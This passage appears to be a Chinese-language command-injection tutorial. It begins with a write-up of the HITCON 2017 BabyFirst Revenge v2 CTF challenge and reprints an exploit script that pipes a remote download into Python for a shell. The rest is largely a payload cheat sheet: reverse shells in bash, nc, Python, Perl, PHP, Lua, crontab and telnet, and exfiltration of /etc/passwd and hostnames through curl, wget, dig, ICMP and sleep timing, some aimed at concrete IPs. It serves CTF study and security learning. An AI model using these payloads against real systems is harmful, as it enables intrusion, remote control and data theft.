+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sandbox</span> = <span class="string">&#x27;/www/sandbox/&#x27;</span> . md5(<span class="string">&quot;orange&quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    @chdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &amp;&amp; strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;reset&#x27;</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">&#x27;/bin/rm -rf &#x27;</span> . <span class="variable">$sandbox</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这题相比之前又难了一点，这次是<code>cmd &lt;= 4</code>，但是原理还是一样的。我们要处理的问题还是<code>ls -t&gt;g</code>这么一个问题。然后因为长度限制，如果我们还用<code>\\</code>作为字符串连接的话，只剩下两个字符，加上最开始必须要用<code>&gt;</code>创建文件，所以只剩下一个可控字符。所以碰到需要转义空格这种地方例如<code>Exmaple 2</code>中的<code>&gt;\ \\</code>这里就不能再使用了。但是我们这里再提一个<code>trick</code></p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fymhdhrmuuj20rk0jy1eq.jpg"></p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fymhg7vu7pj20rm0hkngg.jpg"></p>
+<p><code>*</code> 相当于<code>$(dir *)</code>,所以说如果文件名如果是命令的话就会返回执行的结果,之后的作为参数传入。例如：</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fymhz9q2loj21320h0qtd.jpg"></p>
+<p>所以回到题目，如果按照顺序去创建文件，我们会发现如果直接用<code>*</code>去执行的话，发现并不可以，因为按照<code>dir</code>的文件排序，<code>-t</code>也是排在最前面。</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fymi5dskw0j20j209ujzs.jpg"></p>
+<p>所以我们还需要参考一下<code>alphabetical</code>来排序，这里就不要用<code>Docker</code>来做了，因为<code>busybox</code>里面一些东西还是跟真实环境优点区别的。<img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fymmfc648jj218e0cswgu.jpg"></p>
+<p>所以如果我们需要运用<code>-</code>字符的话，他会排在最前面，这里就比较坑了。所以我们需要想个办法把<code>-t</code>置于后面。</p>
+<p>这里我们可以使用<code>t-</code>这种逆序的模式把<code>t</code>放到前面来，就可以比较正常的排序了。</p>
+<p>逆序的命令我们可以用<code>rev</code>来实现，另外我们还需要一个字母比较靠前的命令来展示当前目录，我们可以采用<code>dir</code>来展示当前目录，同时<code>d</code>字母也比较靠前，不要像<code>ls</code>特别考虑排序的问题。所以我们大概可以通过这么一个形式去构造<code>ls -t&gt;g</code></p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fymxkbytn4j20pg0h41cd.jpg"></p>
+<p>这里可能有几个让大家比较疑惑的地方，比如为什么是<code>&gt;ht-</code>，个人理解是因为<code>ls</code>逆序是<code>sl</code>，<code>s</code>是排在<code>t</code>前的，如果不加<code>h</code>，<code>t-</code>会在<code>sl</code>之后，而且<code>ls -th</code>与<code>ls -t</code>效果是一样的，然后我们再找一个<code>h</code>之前的字母做输出文件就可以了。还有一个地方就是<code>*v&gt;x</code>，之前我们讲过了通配符以及<code>*</code>的作用，这里<code>*v</code>就相当于<code>$(dir *v)&gt;x</code>，<code>dir *v</code>返回的就是结尾为<code>v</code>的文件，这里就是<code>rev</code>与<code>v</code>两个文件，如果只有相当于先把<code>v</code>文件内容进行逆序，而后再输入到<code>x</code>文件，这样整个<code>ls -t&gt;g</code>的命令拼凑就完成了，接着方法就有很多种了，比较简单的就是直接<code>wget</code>或者<code>curl</code>一个<code>webshell</code>到服务器上就好了，就不再赘述了。</p>
+<p>再给一个<code>Orange</code>的<code>exp</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate &quot;g&gt; ht- sl&quot; to file &quot;v&quot;</span></span><br><span class="line">    <span class="string">&#x27;&gt;dir&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;sl&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;g\&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;ht-&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*&gt;v&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment"># reverse file &quot;v&quot; to file &quot;x&quot;, content &quot;ls -th &gt;g&quot;</span></span><br><span class="line">    <span class="string">&#x27;&gt;rev&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*v&gt;x&#x27;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate &quot;curl orange.tw|python;&quot;</span></span><br><span class="line">    <span class="string">&#x27;&gt;\;\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;on\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;th\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;py\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\|\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;tw\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;e.\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;ng\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;ra\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;o\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;rl\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;cu\\&#x27;</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># got shell</span></span><br><span class="line">    <span class="string">&#x27;sh x&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;sh g&#x27;</span>, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">&#x27;http://52.197.41.31/?reset=1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(i) &lt;= <span class="number">4</span></span><br><span class="line">    r = requests.get(<span class="string">&#x27;http://52.197.41.31/?cmd=&#x27;</span> + quote(i) )</span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>相关Writeup:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/bennofs/docs/blob/master/hitcon-2017/baby-first-revenge2.md">Baby First Revenge v2 (Via vim) by @bennofs</a></li>
+<li>[<a target="_blank" rel="noopener" href="https://codegists.com/snippet/python/baby-exppy_beched_python">python] baby-exp.py</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.eugenekolo.com/blog/hitcon-babyfirst-revenge-v2/">How to solve a CTF challenge for $20 - HITCON 2017 BabyFirst Revenge v2</a></li>
+<li><a target="_blank" rel="noopener" href="https://findneo.github.io/2017/11/HITCON-CTF-2017-Babyfirst-Revenge-series-writeup/">HITCON CTF 2017 BabyFirst Revenge &amp; v2 writeup</a></li>
+</ul>
+<h3 id="无回显的命令注入"><a href="#无回显的命令注入" class="headerlink" title="无回显的命令注入"></a>无回显的命令注入</h3><p>我们之前提到的大部分都是有回显或者一部分提示的命令注入，当我们遇到无回显的命令注入的时候我们又要怎么办呢？</p>
+<h4 id="DNS-Log"><a href="#DNS-Log" class="headerlink" title="DNS Log"></a>DNS Log</h4><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/BugScanTeam">BugScanTeam/DNSLog</a></p>
+<p>对于一些命令盲注类的漏洞，这通常是比较有效的方法，因为通常出站DNS流量不会被阻止可以通过，DNSLog 中的 WebLog 部分将其转化为有回显的命令执行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http:&#x2F;&#x2F;testhash.test.dnslog.link&#x2F;?&#96;whoami&#96;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这个用起来比较简单，直接去查看对应的记录就好了。</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fymyefg60qj217e03qqcv.jpg"></p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fymyeptgv0j21ro076ab3.jpg"></p>
+<p>有时候你需要编码想要读出来的内容，这样才不会由于一些空格或者什么其他字符导致读不完整数据。</p>
+<p>这里不仅可以用于命令注入，还可以用于<code>xss</code>等其他一些无回显的攻击。</p>
+<p>这里再给个走<code>udp</code>流量的示例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Only OB DNS traffic (UDP/53) allowed and can <span class="built_in">exec</span> commands? Use </span><br><span class="line">dig `cut -d: -s -f1 /etc/passwd | sed 10\!d` @ip</span><br><span class="line">to offload file contents.</span><br></pre></td></tr></table></figure>
+
+<p>服务端：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -n -vv -p 53 -u -k(如果不支持-k也可以不用-k)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fynlyqbpj2j20ti048ahj.jpg"></p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fynlyxejhmj20le0esh2i.jpg"></p>
+<p>Same:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;dig,`&#123;cut,-d:,-s,-f1,/etc/passwd&#125;|&#123;sed,2\!d&#125;`,@ip&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h4><p>检测是否有命令注入比较好的方式就是使用<code>sleep</code>，并观察其执行时间是否增加。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ time ruby ping.rb <span class="string">&#x27;8.8.8.8&#x27;</span></span><br><span class="line">PING 8.8.8.8 (8.8.8.8): 56 data bytes</span><br><span class="line">...</span><br><span class="line">0.09s user 0.04s system 4% cpu 3.176 total</span><br><span class="line"></span><br><span class="line">$ time ruby ping.rb <span class="string">&#x27;8.8.8.8 &amp;&amp; sleep 5&#x27;</span></span><br><span class="line">PING 8.8.8.8 (8.8.8.8): 56 data bytes</span><br><span class="line">...</span><br><span class="line">0.10s user 0.04s system 1% cpu 8.182 total</span><br></pre></td></tr></table></figure>
+
+<p>可以看出如果存在命令注入，执行时间会按照我们<code>sleep</code>的参数增加，我们这里再简单总结一下前面单引号与双引号的区别</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ping -c 4 8.8.8.8`sleep 5`</td>
+<td>sleep命令被执行，命令替换在命令行中。</td>
+</tr>
+<tr>
+<td>ping -c 4 “8.8.8.8`sleep 5`“</td>
+<td>sleep命令被执行，命令替换在复杂的字符串双引号之间。</td>
+</tr>
+<tr>
+<td>ping -c 4 $(echo 8.8.8.8`sleep 5`)</td>
+<td>sleep命令被执行，命令替换在使用不同符号时。</td>
+</tr>
+<tr>
+<td>ping -c 4 ‘8.8.8.8`sleep 5`‘</td>
+<td>sleep命令不执行，命令替换在简单字符串中不起作用（单引号之间）。</td>
+</tr>
+<tr>
+<td>ping -c 4 `echo 8.8.8.8`sleep 5``</td>
+<td>sleep命令不执行，使用相同符号时命令替换不起作用。</td>
+</tr>
+<tr>
+<td>ping -c 4 8.8.8.8;sleep 5</td>
+<td>sleep命令被执行，命令在命令行中顺序执行。</td>
+</tr>
+<tr>
+<td>ping -c 4 “8.8.8.8;sleep 5”</td>
+<td>sleep命令未被执行，附加命令被注入到一个字符串中，该字符串作为参数传递给ping命令。</td>
+</tr>
+<tr>
+<td>ping -c 4 $(echo 8.8.8.8;sleep 5)</td>
+<td>sleep命令被执行，排序命令在命令替换中起作用。</td>
+</tr>
+<tr>
+<td>ping -c 4 ‘8.8.8.8;sleep 5’</td>
+<td>sleep命令未被执行， 附加命令被注入到一个字符串中，该字符串作为参数传递给ping命令。</td>
+</tr>
+<tr>
+<td>ping -c 4 `echo 8.8.8.8;sleep 5`</td>
+<td>sleep命令被执行，排序命令在命令替换中起作用。</td>
+</tr>
+<tr>
+<td>ping -c 4 8.8.8.8 | sleep 5</td>
+<td>sleep命令被执行，管道输出在命令行正常执行。</td>
+</tr>
+<tr>
+<td>ping -c 4 “8.8.8.8 | sleep 5”</td>
+<td>sleep命令未被执行，附加命令被注入到一个字符串中，该字符串作为参数传递给ping命令。</td>
+</tr>
+<tr>
+<td>ping -c 4 $(echo 8.8.8.8 | sleep 5)</td>
+<td>sleep命令被执行，管道输出在命令替换中起作用。</td>
+</tr>
+<tr>
+<td>ping -c 4 ‘8.8.8.8 | sleep 5’</td>
+<td>sleep命令未被执行，附加命令被注入到一个字符串中，该字符串作为参数传递给ping命令。</td>
+</tr>
+<tr>
+<td>ping -c 4 `echo 8.8.8.8 | sleep 5`</td>
+<td>sleep命令被执行，管道输出在命令替换中起作用。</td>
+</tr>
+</tbody></table>
+<p>除了探测是否有命令注入之外，<code>sleep</code>还有一个可以用于命令盲注的方法。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep $(hostname | cut -c 1 | tr a 5)</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>我们执行的命令为<code>hostname</code>。我们假设它返回<code>hacker.local</code>。</li>
+<li>它需要输出并将其传递给<code>cut -c 1</code>。这将选取<code>hacker.local</code>的第一个字符h。</li>
+<li>接着通过tr命令将字符<code>a</code>替换为5。</li>
+<li>然后将tr命令的输出传递给<code>sleep</code>命令，<code>sleep h</code>被执行将会立即出现报错，这是因为<code>sleep</code>后跟的参数智能为一个数字。然后，目标使用tr命令迭代字符。执行<code>sleep $(hostname | cut -c 1 | tr h 5)</code>命令，将需要5秒钟的时间。这样我们就可以确定第一个字符是一个h。以此类推，我们就能将完整的主机名猜解出来。</li>
+</ol>
+<p>当然，这个利用条件可能对网络环境要求比较高，但是依靠响应时间的相对时间来判断，也还是比较容易判断的，测试示例：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>时间</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ruby server-online.rb ‘8.8.8.8;sleep $(hostname | cut -c 1 | tr a 5)’</td>
+<td>3s</td>
+<td>–</td>
+</tr>
+<tr>
+<td>ruby server-online.rb ‘8.8.8.8;sleep $(hostname | cut -c 1 | tr h 5)’</td>
+<td>8s</td>
+<td>h</td>
+</tr>
+<tr>
+<td>ruby server-online.rb ‘8.8.8.8;sleep $(hostname | cut -c 2 | tr a 5)’</td>
+<td>8s</td>
+<td>a</td>
+</tr>
+<tr>
+<td>ruby server-online.rb ‘8.8.8.8;sleep $(hostname | cut -c 3 | tr a 5)’</td>
+<td>3s</td>
+<td>–</td>
+</tr>
+<tr>
+<td>ruby server-online.rb ‘8.8.8.8;sleep $(hostname | cut -c 3 | tr c 5)’</td>
+<td>8s</td>
+<td>c</td>
+</tr>
+</tbody></table>
+<p>如果想要知道目标主机名的长度，我们可以将主机名的输出通过管道符传递给<code>wc -c</code>命令。<code>hacker.local</code>为<code>12</code>个字符。<code>hostname</code>命令返回主机名和一个新行，因此<code>wc -c</code>将显示13个字符。经过我们测试，脚本的执行时间最短需要3秒钟。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ time ruby server-online.rb <span class="string">&#x27;8.8.8.8 &amp;&amp; sleep $(hostname | wc -c)&#x27;</span></span><br><span class="line">yes</span><br><span class="line">0.10s user 0.04s system 0% cpu 16.188 total</span><br></pre></td></tr></table></figure>
+
+<p>可以看到以上的payload脚本共用时16秒才执行完成，这意味着主机名为12个字符：16 – 3 (原时间) – 1 (新行) = 12个字符。当在Web服务器上执行此payload时，输出结果可能会有所不同：当请求由不同的服务器处理时，主机名的长度也可能会改变。</p>
+<p>本次<code>NUAACTF</code>我也是从这里出了一个点，强迫使用<code>sleep $(xxx)</code>来读取<code>flag</code>。</p>
+<h4 id="使用暴露的服务"><a href="#使用暴露的服务" class="headerlink" title="使用暴露的服务"></a>使用暴露的服务</h4><p>在服务器上执行端口扫描，并且基于暴露的服务确定提取输出的方式。</p>
+<ul>
+<li><strong>FTP</strong>：尝试将文件写入可以从中下载文件的目录。</li>
+<li><strong>SSH</strong>：尝试将命令的输出写入MOTD banner，然后只需SSH到服务器。</li>
+<li><strong>Web</strong>：尝试将命令的输出写入公共目录（/var/www/）中。</li>
+</ul>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>不过无论怎么玩，还是直接弹回一个<code>shell</code>来最实用，于是可以有</p>
+<p><code>bash</code>方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&quot;sh &gt;&amp; /dev/tcp/your ip/port 0&gt;&amp;1&quot;</span> </span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>exec</code>方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/ip/port</span><br><span class="line">$ cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fymz6ztna0j20lw0au10p.jpg"></p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fymz73833rj210w05gn41.jpg"></p>
+<p><code>nc</code>方式</p>
+<p>本机运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -vv -p port</span><br></pre></td></tr></table></figure>
+
+<p>目标主机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash ip port</span><br></pre></td></tr></table></figure>
+
+
+
+<p>另一种<code>nc</code>方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; nc ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh | nc 受害者ip port		<span class="comment">#这个比较特殊,需要在你自己的机器上运行</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>python</code>方式</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>另一种</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&#x27;ip&#x27;,port))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>Perl</code>方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>php</code>方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;ip&quot;,port);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>lua</code>方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;ip&#x27;,&#x27;port&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span></span><br><span class="line"><span class="comment">#需要lua socket支持，且lua5.2+不支持luasocket</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>crontab</code>方式</p>
+<p><code>crontab -e</code>编辑当前用户的任务，或者是写到计划任务目录，一般是 <code>/var/spool/cron/</code> 目录，<code>ubuntu</code>是<code> / var/spool/cron/crontabs</code>。文件名为用户名<code>root</code>等。下面命令含义是每一分钟执行一次反弹<code>shell</code>命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHELL&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">* * * * * &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>telnet</code>方式</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>msf</code>方式有很多种，这里就不再提了。</p>
+<h4 id="Trick"><a href="#Trick" class="headerlink" title="Trick"></a>Trick</h4><p>无空格：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 4 8.8.8.8;hostname|&#123;nc,ip,port&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用<code>nc</code>将文件重定向：</p>
+<p>靶机上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp port &lt; /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>本机直接<code>nc ip port</code>得到文件内容</p>
+<p>使用<code>http</code>协议，通过<code>curl</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://ip:port -F a=@/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>同样可以通过<code>curl</code>使用<code>ftp</code>协议，同理<code>wget</code>、<code>telnet</code>当然也是可以的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget --post-data=<span class="string">&quot;`cat /etc/passwd`&quot;</span> http://ip:port</span><br><span class="line"></span><br><span class="line">wget --post-file=/etc/passwd http://ip:port</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet 106.14.153.173 2015 &lt; /etc/passwd</span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用<code>ICMP</code>报文</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat password.txt | xxd -p -c 16 | <span class="keyword">while</span> <span class="built_in">read</span> exfil; <span class="keyword">do</span> ping -p <span class="variable">$exfil</span> -c 1 xxx.xxx.xxx.xxx; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="更正"><a href="#更正" class="headerlink" title="更正"></a>更正</h3><p>2019/2/13，更正了文章几处错误，已更新文章内容错误处</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;</span>)	<span class="comment">#可以执行</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://medium.com/secjuice/waf-evasion-techniques-718026d693d8">Web Application Firewall (WAF) Evasion Techniques</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.owasp.org/index.php/Command_Injection">Command Injection - OWASP</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/commixproject/commix">coomix</a></p>
+<p><a target="_blank" rel="noopener" href="https://juejin.im/post/5bdf02c9e51d450540286fbf">Web 安全漏洞之 OS 命令注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/balaamwe/archive/2012/03/15/2397998.html">linux特殊符号大全</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/command_exec_tips_1.html">小密圈专题(2)-命令执行绕过</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miyatang/article/details/8077123">linux bash shell中，单引号、 双引号，反引号（``）的区别及各种括号的区别</a></p>
+<p><a target="_blank" rel="noopener" href="http://poetichacker.com/writeup/%e7%94%b1iscc2018-web-ping%e5%ad%a6%e4%b9%a0%e5%91%bd%e4%bb%a4%e6%b3%a8%e5%85%a5.html">由ISCC2018-Web-Ping学习命令注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ewilded/shelling">shelling</a></p>
